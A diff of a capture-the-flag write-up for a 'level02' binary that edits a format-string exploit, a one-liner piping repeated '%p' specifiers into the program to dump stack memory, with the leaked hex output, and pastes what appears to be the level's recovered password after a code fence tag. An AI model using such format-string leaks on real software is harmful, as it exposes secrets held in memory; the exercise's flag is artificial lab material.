@@ -17,7 +17,7 @@ admin does not have access!
 
 Analyze with ghidra and disassembler the code in GDB
 
-```c
+```cHh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
 // check source.c file
 ```
 
@@ -54,7 +54,7 @@ $> gdb -q level02
 We know .pass content stock in stack, and with printf format vulnerability, we can print the content of the stack.
 
 ```shell
-$> python -c "print '%p | ' * 100" | ./level02
+$> python -c "print '%p ' * 100" | ./level02
 [...]
 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
 [...]
